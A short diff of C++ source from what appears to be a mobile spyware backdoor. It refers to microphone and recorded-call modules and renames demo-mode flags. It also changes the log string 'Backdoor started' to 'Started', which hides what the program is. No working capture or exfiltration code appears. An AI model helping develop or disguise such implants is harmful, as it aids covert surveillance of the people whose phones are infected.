@@ -12,6 +12,7 @@
 #include "Microphone.h"
 #include "RecordedCalls.h"
 #include "Date.h"
+#include "Common.h"
 
 using namespace std;
 
@@ -68,7 +69,7 @@ modulesManager(NULL), wakeupEvent(NULL), uninstallRequested(FALSE) {
 	eventsManager = EventsManager::self();
 	actionsManager = ActionsManager::self();
 
-	sha1.Sha1(g_Demo, 24, sha);
+	sha1.Sha1(g_DemoMode, 24, sha);
 
 	if (memcmp(sha, demoMode, 20) == 0)
 		demo = TRUE;
@@ -98,7 +99,7 @@ Task::~Task(){
 void Task::StartNotification() {
 	Log logInfo;
 
-	logInfo.WriteLogInfo(L"Backdoor started");
+	logInfo.WriteLogInfo(L"Started");
 }
 
 BOOL Task::TaskInit() {
@@ -156,7 +157,7 @@ BOOL Task::TaskInit() {
 	ADDDEMOMESSAGE(L"Events... OK\nAgents:... OK\n");
 
 #ifndef _DEBUG
-	if (demo) {
+	if (getDemo()) {
 		MessageBeep(MB_OK);
 		MessageBeep(MB_OK);
 		BlinkLeds();
@@ -173,7 +174,7 @@ BOOL Task::CheckActions() {
 	WaitForSingleObject(wakeupEvent, INFINITE);
 
 #ifndef _DEBUG
-	if (demo) {
+	if (getDemo()) {
 		MessageBeep(MB_OK);
 		BlinkLeds();
 	}
